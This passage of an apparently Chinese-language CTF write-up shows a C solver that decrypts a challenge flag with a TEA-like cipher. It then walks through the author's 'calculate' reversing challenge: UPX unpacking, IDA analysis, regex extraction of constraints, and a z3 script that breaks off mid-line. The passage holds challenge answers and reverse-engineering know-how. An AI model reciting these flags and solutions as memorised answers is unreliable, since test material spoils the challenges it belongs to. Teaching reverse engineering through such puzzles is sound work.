v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc[] =</span><br><span class="line">            &#123;</span><br><span class="line">                    <span class="number">151</span>, <span class="number">1</span>, <span class="number">230</span>, <span class="number">228</span>, <span class="number">108</span>, <span class="number">72</span>, <span class="number">77</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">91</span>,</span><br><span class="line">                    <span class="number">201</span>, <span class="number">234</span>, <span class="number">169</span>, <span class="number">5</span>, <span class="number">191</span>, <span class="number">10</span>, <span class="number">30</span>, <span class="number">182</span>, <span class="number">36</span>, <span class="number">110</span>,</span><br><span class="line">                    <span class="number">124</span>, <span class="number">68</span>, <span class="number">95</span>, <span class="number">166</span>, <span class="number">62</span>, <span class="number">44</span>, <span class="number">76</span>, <span class="number">75</span>, <span class="number">236</span>, <span class="number">233</span>,</span><br><span class="line">                    <span class="number">63</span>, <span class="number">193</span>, <span class="number">0</span></span><br><span class="line">            &#125;;</span><br><span class="line">    <span class="type">uint32_t</span> key[<span class="number">4</span>] = &#123;</span><br><span class="line">            <span class="number">4660</span>, <span class="number">22136</span>, <span class="number">39612</span>, <span class="number">57072</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i) &#123;</span><br><span class="line">        decrypt((<span class="type">uint32_t</span> *) &amp;enc[<span class="number">8</span> * i], (<span class="type">uint32_t</span> *) key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        // 注释的这个交换是为了解决v[0]和v[1]的互换,但是发现v5和v6的值没有考虑?</span></span><br><span class="line"><span class="comment">        // 我的密码学不太好,总之直接解密函数中两行上下一交换就行...</span></span><br><span class="line"><span class="comment">        uint32_t * p = (uint32_t *) &amp;enc[8 * i];</span></span><br><span class="line"><span class="comment">        uint32_t temp = p[0];</span></span><br><span class="line"><span class="comment">        p[0] = p[1];</span></span><br><span class="line"><span class="comment">        p[1] = temp;*/</span></span><br><span class="line">        decrypt2((<span class="type">uint32_t</span> *) &amp;enc[<span class="number">8</span> * i], (<span class="type">uint32_t</span> *) key);</span><br><span class="line">        <span class="comment">/*temp = p[0];</span></span><br><span class="line"><span class="comment">        p[0] = p[1];</span></span><br><span class="line"><span class="comment">        p[1] = temp;*/</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, enc[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得出flag:</p><p><code>XSCTF&#123;5MC_1s_v3ry_int3re5t1ng!!&#125;</code></p><h1 id="我出的题">我出的题</h1><h2 id="reverse">Reverse</h2><h3 id="题目1-calculate">题目1-calculate</h3><p>本题使用python3的z3库即可进行求解线性方程组,主要讲解正则表达式的利用.</p><p>打开会发现有一个有个UPX4的加壳,先在linux下进行脱壳.</p><p>随后丢进IDA分析,在check()函数中找到flag的检测,每一个if就是一个线性方程.</p><p>把所有的if语句的条件提取出来,就构成了一个线性方程组.</p><p>由于量比较大,我们先把函数复制出来,删掉其他东西,然后使用正则表达式进行提取:</p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20231016220733656.png" alt="image-20231016220733656" style="zoom:33%;" /><p>利用正则表达式进行一步步的处理:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016220842093.png" alt="image-20231016220842093" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016221050337.png" alt="image-20231016221050337" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016220919474.png" alt="image-20231016220919474" style="zoom: 50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016221423433.png" alt="image-20231016221423433" style="zoom:50%;" /><p>我们直接把<code>if(</code>替换成python的z3库中需要使用到的语句,也就是<code>solver.add(</code></p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016221454785.png" alt="image-20231016221454785" style="zoom:50%;" /><p>清一下空格:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016221532897.png" alt="image-20231016221532897" style="zoom:50%;" /><p>发现代码中有位运算,同样处理一下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016222045012.png" alt="image-20231016222045012" style="zoom:50%;" /><p>记得把最后return语句的那个方程也处理一下</p><p>然后把数组转换为一个个的变量:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016222300876.png" alt="image-20231016222300876" style="zoom:50%;" /><p>最终结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016222319452.png" alt="image-20231016222319452" style="zoom:50%;" /><p>然后我们就可以使用python的z3库进行运算了,其余细节见脚本的注释:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(1, 32):</span></span><br><span class="line"><span class="comment">#     print(&#x27;x&#x27; + str(i) + &#x27;,&#x27;, end=&#x27;&#x27;)</span></span><br><span class="line"><span class="comment"># print(&#x27; = Ints(\&#x27;&#x27;, end=&#x27;&#x27;)</span></span><br><span class="line"><span class="comment"># for i in range(1, 32):</span></span><br><span class="line"><span class="comment">#     print(&#x27;x&#x27;+str(i),end=&#x27; &#x27;)</span></span><br><span class="line"><span class="comment"># print(&#x27;\&#x27;)&#x27;)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate</span>():</span><br><span class="line">    x0, x1, x2, x3, x4, x5, x6, x7, x8, x9, x10, x11, x12, x13, x14, x15, x16, x17, x18, x19, x20, x21, x22, x23= Ints(</span><br><span class="line">        <span class="string">&#x27;x0 x1 x2 x3 x4 x5 x6 x7 x8 x9 x10 x11 x12 x13 x14 x15 x16 x17 x18 x19 x20 x21 x22 x23&#x27;</span>)</span><br><span class="line">    solver = Solver()</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">212</span> * x22 + <span class="number">819</span> * x21 + <span class="number">421</span> * x20 + <span class="number">814</span> * x19 + <span class="number">781</span> * x18 + <span class="number">184</span> * x17 + <span class="number">709</span> * x16 + <span class="number">401</span> * x15 + <span class="number">351</span> * x14 + <span class="number">993</span> * x13 + <span class="number">814</span> * x12 + <span class="number">553</span> * x11 + <span class="number">495</span> * x10 + <span class="number">646</span> * x9 + <span class="number">565</span> * x8 + <span class="number">271</span> * x7 + <span class="number">520</span> * x6 + <span class="number">770</span> * x5 + <span class="number">335</span> * x4 + <span class="number">680</span> * x3 + <span class="number">625</span> * x2 + <span class="number">215</span> * x1 + <span class="number">250</span> * x0 + <span class="number">525</span> * x23 == <span class="number">1173434</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">909</span> * x22 + <span class="number">819</span> * x21 + <span class="number">404</span> * x20 + <span class="number">323</span> * x19 + <span class="number">961</span> * x18 + <span class="number">625</span> * x17 + <span class="number">630</span> * x16 + <span class="number">760</span> * x15 + <span class="number">781</span> * x14 + <span class="number">353</span> * x13 + <span class="number">207</span> * x12 + <span class="number">363</span> * x11 + <span class="number">126</span> * x10 + <span class="number">569</span> * x9 + <span class="number">279</span> * x8 + <span class="number">988</span> * x7 + <span class="number">115</span> * x6 + <span class="number">815</span> * x5 + <span class="number">598</span> * x4 + <span class="number">186</span> * x3 + <span class="number">795</span> * x2 + <span class="number">744</span> * x1 + <span class="number">371</span> * x0 + <span class="number">354</span> * x23 == <span class="number">1290416</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">216</span> * x22 + <span class="number">482</span> * x21 + <span class="number">239</span> * x20 + <span class="number">185</span> * x19 + <span class="number">726</span> * x18 + <span class="number">809</span> * x17 + <span class="number">414</span> * x16 + <span class="number">655</span> * x15 + <span class="number">771</span> * x14 + <span class="number">974</span> * x13 + <span class="number">888</span> * x12 + <span class="number">784</span> * x11 + <span class="number">716</span> * x10 + <span class="number">998</span> * x9 + <span class="number">251</span> * x8 + <span class="number">889</span> * x7 + <span class="number">503</span> * x6 + <span class="number">594</span> * x5 + <span class="number">895</span> * x4 + <span class="number">663</span> * x3 + <span class="number">145</span> * x2 + <span class="number">371</span> * x1 + <span class="number">276</span> * x0 + <span class="number">609</span> * x23 == <span class="number">1339295</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">361</span> * x22 + <span class="number">721</span> * x21 + <span class="number">877</span> * x20 + <span class="number">449</span> * x19 + <span class="number">868</span> * x18 + <span class="number">356</span> * x17 + <span class="number">138</span> * x16 + <span class="number">345</span> * x15 + <span class="number">568</span> * x14 + <span class="number">310</span> * x13 + <span class="number">601</span> * x12 + <span class="number">121</span> * x11 + <span class="number">590</span> * x10 + <span class="number">132</span> * x9 + <span class="number">308</span> * x8 + <span class="number">928</span> * x7 + <span class="number">655</span> * x6 + <span class="number">806</span> * x5 + <span class="number">538</span> * x4 + <span class="number">736</span> * x3 + <span class="number">409</span> * x2 + <span class="number">697</span> * x1 + <span class="number">936</span> * x0 + <span class="number">465</span> * x23 == <span class="number">1167720</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">946</span> * x22 + <span class="number">620</span> * x21 + <span class="number">707</span> * x20 + <span class="number">934</span> * x19 + <span class="number">729</span> * x18 + <span class="number">939</span> * x17 + <span class="number">837</span> * x16 + <span class="number">672</span> * x15 + <span class="number">930</span> * x14 + <span class="number">972</span> * x13 + <span class="number">970</span> * x12 + <span class="number">990</span> * x11 + <span class="number">357</span> * x10 + <span class="number">721</span> * x9 + <span class="number">757</span> * x8 + <span class="number">845</span> * x7 + <span class="number">355</span> * x6 + <span class="number">155</span> * x5 + <span class="number">186</span> * x4 + <span class="number">201</span> * x3 + <span class="number">391</span> * x2 + <span class="number">208</span> * x1 + <span class="number">269</span> * x0 + <span class="number">979</span> * x23 == <span class="number">1457642</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">992</span> * x22 + <span class="number">243</span> * x21 + <span class="number">970</span> * x20 + <span class="number">752</span> * x19 + <span class="number">518</span> * x18 + <span class="number">657</span> * x17 + <span class="number">995</span> * x16 + <span class="number">176</span> * x15 + <span class="number">837</span> * x14 + <span class="number">330</span> * x13 + <span class="number">840</span> * x12 + <span class="number">806</span> * x11 + <span class="number">964</span> * x10 + <span class="number">400</span> * x9 + <span class="number">207</span> * x8 + <span class="number">561</span> * x7 + <span class="number">620</span> * x6 + <span class="number">147</span> * x5 + <span class="number">938</span> * x4 + <span class="number">333</span> * x3 + <span class="number">957</span> * x2 + <span class="number">603</span> * x1 + <span class="number">652</span> * x0 + <span class="number">366</span> * x23 == <span class="number">1424563</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">650</span> * x22 + <span class="number">998</span> * x21 + <span class="number">297</span> * x20 + <span class="number">634</span> * x19 + <span class="number">427</span> * x18 + <span class="number">380</span> * x17 + <span class="number">174</span> * x16 + <span class="number">313</span> * x13 + <span class="number">955</span> * x10 + <span class="number">712</span> * x9 + <span class="number">764</span> * x8 + <span class="number">369</span> * x7 + <span class="number">923</span> * x6 + <span class="number">547</span> * x5 + <span class="number">898</span> * x4 + <span class="number">587</span> * x3 + <span class="number">315</span> * x2 + <span class="number">842</span> * x1 + <span class="number">425</span> * x0 + <span class="number">920</span> * x11 + <span class="number">768</span> * x12 + <span class="number">784</span> * x14 + <span class="number">144</span> * x15 + <span class="number">756</span> * x23 == <span class="number">1289169</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">456</span> * x22 + <span class="number">943</span> * x21 + <span class="number">629</span> * x20 + <span class="number">463</span> * x19 + <span class="number">154</span> * x18 + <span class="number">366</span> * x17 + <span class="number">265</span> * x16 + <span class="number">253</span> * x15 + <span class="number">168</span> * x14 + <span class="number">766</span> * x13 + <span class="number">689</span> * x12 + <span class="number">986</span> * x11 + <span class="number">523</span> * x10 + <span class="number">756</span> * x9 + <span class="number">978</span> * x8 + <span class="number">941</span> * x7 + <span class="number">684</span> * x6 + <span class="number">922</span> * x5 + <span class="number">263</span> * x4 + <span class="number">162</span> * x3 + <span class="number">510</span> * x2 + <span class="number">600</span> * x1 + <span class="number">655</span> * x0 + <span class="number">488</span> * x23 == <span class="number">1255084</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">895</span> * x22 + <span class="number">560</span> * x21 + <span class="number">701</span> * x20 + <span class="number">123</span> * x19 + <span class="number">937</span> * x18 + <span class="number">922</span> * x17 + <span class="number">515</span> * x16 + <span class="number">178</span> * x15 + <span class="number">467</span> * x14 + <span class="number">370</span> * x13 + <span class="number">475</span> * x12 + <span class="number">346</span> * x11 + <span class="number">261</span> * x10 + <span class="number">946</span> * x9 + <span class="number">921</span> * x8 + <span class="number">324</span> * x7 + <span class="number">149</span> * x6 + <span class="number">809</span> * x5 + <span class="number">163</span> * x4 + <span class="number">732</span> * x3 + <span class="number">228</span> * x2 + <span class="number">651</span> * x1 + <span class="number">788</span> * x0 + <span class="number">248</span> * x23 == <span class="number">1244160</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">174</span> * x22 + <span class="number">850</span> * x21 + <span class="number">999</span> * x20 + <span class="number">430</span> * x19 + <span class="number">587</span> * x18 + <span class="number">272</span> * x17 + <span class="number">361</span> * x16 + <span class="number">644</span> * x15 + <span class="number">887</span> * x14 + <span class="number">180</span> * x13 + <span class="number">787</span> * x12 + <span class="number">646</span> * x11 + <span class="number">275</span> * x10 + <span class="number">383</span> * x9 + <span class="number">426</span> * x8 + <span class="number">208</span> * x7 + <span class="number">267</span> * x6 + <span class="number">697</span> * x5 + <span class="number">226</span> * x4 + <span class="number">339</span> * x3 + <span class="number">209</span> * x2 + <span class="number">388</span> * x1 + <span class="number">739</span> * x0 + <span class="number">821</span> * x23 == <span class="number">1043988</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">106</span> * x22 + <span class="number">247</span> * x21 + <span class="number">249</span> * x20 + <span class="number">962</span> * x19 + <span class="number">138</span> * x18 + <span class="number">984</span> * x17 + <span class="number">763</span> * x16 + <span class="number">934</span> * x15 + <span class="number">350</span> * x14 + <span class="number">559</span> * x13 + <span class="number">913</span> * x12 + <span class="number">499</span> * x11 + <span class="number">369</span> * x10 + <span class="number">855</span> * x9 + <span class="number">733</span> * x8 + <span class="number">205</span> * x7 + <span class="number">446</span> * x4 + <span class="number">997</span> * x3 + <span class="number">890</span> * x2 + <span class="number">101</span> * x1 + <span class="number">855</span> * x0 + <span class="number">518</span> * x5 + <span class="number">192</span> * x6 + <span class="number">751</span> * x23 == <span class="number">1286775</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">388</span> * x22 + <span class="number">169</span> * x21 + <span class="number">579</span> * x20 + <span class="number">507</span> * x19 + <span class="number">676</span> * x18 + <span class="number">673</span> * x17 + <span class="number">106</span> * x16 + <span class="number">629</span> * x15 + <span class="number">657</span> * x14 + <span class="number">998</span> * x13 + <span class="number">624</span> * x12 + <span class="number">677</span> * x11 + <span class="number">109</span> * x10 + <span class="number">352</span> * x9 + <span class="number">344</span> * x8 + <span class="number">333</span> * x7 + <span class="number">989</span> * x6 + <span class="number">383</span> * x5 + <span class="number">927</span> * x4 + <span class="number">378</span> * x3 + <span class="number">868</span> * x2 + <span class="number">568</span> * x1 + <span class="number">363</span> * x0 + <span class="number">408</span> * x23 == <span class="number">1212216</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(<span class="number">919</span> * x22 + <span class="number">396</span> * x21 + (x20 * <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">7</span>))</span><br><span class="line">               + <span class="number">167</span> * x19 + <span class="number">391</span> * x18 + <span class="number">326</span> * x17 + <span class="number">992</span> * x16 + <span class="number">369</span> * x15 + <span class="number">874</span> * x14 + <span class="number">322</span> * x13 + <span class="number">793</span> * x12 + <span class="number">851</span> * x11 + <span class="number">312</span> * x10 + <span class="number">571</span> * x9 + <span class="number">789</span> * x8 + <span class="number">641</span> * x7 + <span class="number">380</span> * x6 + <span class="number">892</span> * x5 + <span class="number">368</span> * x4 + <span class="number">410</span> * x3 + <span class="number">855</span> * x2 + <span class="number">223</span> * x1 + <span class="number">958</span> * x0 + <span class="number">248</span> * x23 == <span class="number">1325165</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">857</span> * x22 + <span class="number">651</span> * x21 + <span class="number">264</span> * x20 + <span class="number">380</span> * x19 + <span class="number">967</span> * x18 + <span class="number">264</span> * x17 + <span class="number">186</span> * x16 + <span class="number">249</span> * x15 + <span class="number">939</span> * x14 + <span class="number">548</span> * x13 + <span class="number">101</span> * x12 + <span class="number">400</span> * x11 + <span class="number">660</span> * x10 + <span class="number">317</span> * x9 + <span class="number">876</span> * x8 + <span class="number">838</span> * x7 + <span class="number">231</span> * x6 + <span class="number">923</span> * x5 + <span class="number">676</span> * x4 + <span class="number">896</span> * x3 + <span class="number">518</span> * x2 + <span class="number">696</span> * x1 + <span class="number">401</span> * x0 + <span class="number">684</span> * x23 == <span class="number">1264958</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">766</span> * x22 + <span class="number">434</span> * x21 + <span class="number">662</span> * x20 + <span class="number">986</span> * x19 + <span class="number">613</span> * x18 + <span class="number">145</span> * x17 + <span class="number">236</span> * x16 + <span class="number">981</span> * x15 + <span class="number">917</span> * x14 + <span class="number">465</span> * x13 + <span class="number">706</span> * x12 + <span class="number">480</span> * x11 + <span class="number">699</span> * x10 + <span class="number">817</span> * x9 + <span class="number">617</span> * x8 + <span class="number">148</span> * x7 + <span class="number">653</span> * x6 + <span class="number">299</span> * x5 + <span class="number">736</span> * x4 + <span class="number">530</span> * x3 + <span class="number">867</span> * x2 + <span class="number">283</span> * x1 + <span class="number">248</span> * x0 + <span class="number">575</span> * x23 == <span class="number">1281865</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">924</span> * x22 + <span class="number">494</span> * x21 + <span class="number">663</span> * x20 + <span class="number">282</span> * x19 + <span class="number">201</span> * x18 + <span class="number">230</span> * x17 + <span class="number">198</span> * x16 + <span class="number">913</span> * x15 + <span class="number">604</span> * x14 + <span class="number">167</span> * x13 + <span class="number">262</span> * x12 + <span class="number">997</span> * x11 + <span class="number">238</span> * x10 + <span class="number">478</span> * x9 + <span class="number">734</span> * x8 + <span class="number">878</span> * x7 + <span class="number">225</span> * x6 + <span class="number">231</span> * x5 + <span class="number">508</span> * x4 + <span class="number">660</span> * x3 + <span class="number">846</span> * x2 + <span class="number">400</span> * x1 + <span class="number">407</span> * x0 + <span class="number">718</span> * x23 == <span class="number">1179318</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">148</span> * x22 + <span class="number">815</span> * x21 + <span class="number">569</span> * x20 + <span class="number">139</span> * x19 + <span class="number">142</span> * x18 + <span class="number">798</span> * x17 + <span class="number">157</span> * x16 + <span class="number">871</span> * x15 + <span class="number">272</span> * x14 + <span class="number">473</span> * x13 + <span class="number">574</span> * x12 + <span class="number">357</span> * x11 + <span class="number">653</span> * x10 + <span class="number">678</span> * x9 + <span class="number">792</span> * x8 + <span class="number">328</span> * x7 + <span class="number">125</span> * x6 + <span class="number">803</span> * x5 + <span class="number">910</span> * x4 + <span class="number">210</span> * x3 + <span class="number">318</span> * x2 + <span class="number">130</span> * x1 + <span class="number">240</span> * x0 + <span class="number">723</span> * x23 == <span class="number">1011571</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">731</span> * x22 + <span class="number">156</span> * x21 + <span class="number">542</span> * x20 + <span class="number">859</span> * x19 + <span class="number">811</span> * x18 + <span class="number">715</span> * x17 + <span class="number">135</span> * x16 + <span class="number">658</span> * x15 + <span class="number">122</span> * x14 + <span class="number">970</span> * x13 + <span class="number">678</span> * x12 + <span class="number">920</span> * x11 + <span class="number">820</span> * x10 + <span class="number">421</span> * x9 + <span class="number">392</span> * x8 + <span class="number">197</span> * x7 + <span class="number">720</span> * x6 + <span class="number">622</span> * x5 + <span class="number">683</span> * x2 + <span class="number">514</span> * x1 + <span class="number">782</span> * x0 + <span class="number">716</span> * x3 + <span class="number">257</span> * x4 + <span class="number">945</span> * x23 == <span class="number">1289012</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">157</span> * x22 + <span class="number">380</span> * x21 + <span class="number">141</span> * x20 + <span class="number">650</span> * x19 + <span class="number">989</span> * x18 + <span class="number">870</span> * x17 + <span class="number">247</span> * x16 + <span class="number">732</span> * x15 + <span class="number">171</span> * x14 + <span class="number">854</span> * x13 + <span class="number">316</span> * x12 + <span class="number">752</span> * x11 + <span class="number">369</span> * x10 + <span class="number">616</span> * x9 + <span class="number">873</span> * x8 + <span class="number">691</span> * x7 + <span class="number">565</span> * x6 + <span class="number">515</span> * x5 + <span class="number">973</span> * x4 + <span class="number">694</span> * x3 + <span class="number">785</span> * x2 + <span class="number">451</span> * x1 + <span class="number">978</span> * x0 + <span class="number">167</span> * x23 == <span class="number">1359077</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">395</span> * x22 + <span class="number">161</span> * x21 + <span class="number">302</span> * x20 + <span class="number">376</span> * x19 + <span class="number">393</span> * x18 + <span class="number">424</span> * x17 + <span class="number">641</span> * x16 + <span class="number">670</span> * x15 + <span class="number">888</span> * x14 + <span class="number">293</span> * x13 + <span class="number">921</span> * x12 + <span class="number">503</span> * x11 + <span class="number">525</span> * x10 + <span class="number">200</span> * x9 + <span class="number">955</span> * x8 + <span class="number">866</span> * x7 + <span class="number">597</span> * x6 + <span class="number">345</span> * x5 + <span class="number">900</span> * x4 + <span class="number">638</span> * x3 + <span class="number">107</span> * x2 + <span class="number">938</span> * x1 + <span class="number">642</span> * x0 + <span class="number">983</span> * x23 == <span class="number">1274421</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">590</span> * x22 + <span class="number">146</span> * x21 + <span class="number">452</span> * x20 + <span class="number">448</span> * x19 + <span class="number">212</span> * x18 + <span class="number">133</span> * x17 + <span class="number">907</span> * x16 + <span class="number">230</span> * x15 + <span class="number">456</span> * x14 + <span class="number">578</span> * x13 + <span class="number">751</span> * x12 + <span class="number">936</span> * x11 + <span class="number">265</span> * x10 + <span class="number">701</span> * x9 + <span class="number">932</span> * x8 + <span class="number">377</span> * x7 + <span class="number">463</span> * x6 + <span class="number">956</span> * x5 + <span class="number">937</span> * x4 + <span class="number">858</span> * x1 + <span class="number">609</span> * x0 + <span class="number">847</span> * x2 + <span class="number">192</span> * x3 + <span class="number">217</span> * x23 == <span class="number">1341461</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">654</span> * x22 + <span class="number">828</span> * x21 + <span class="number">474</span> * x20 + <span class="number">603</span> * x19 + <span class="number">494</span> * x18 + <span class="number">213</span> * x17 + <span class="number">998</span> * x16 + <span class="number">307</span> * x15 + <span class="number">790</span> * x14 + <span class="number">814</span> * x13 + <span class="number">448</span> * x12 + <span class="number">987</span> * x11 + <span 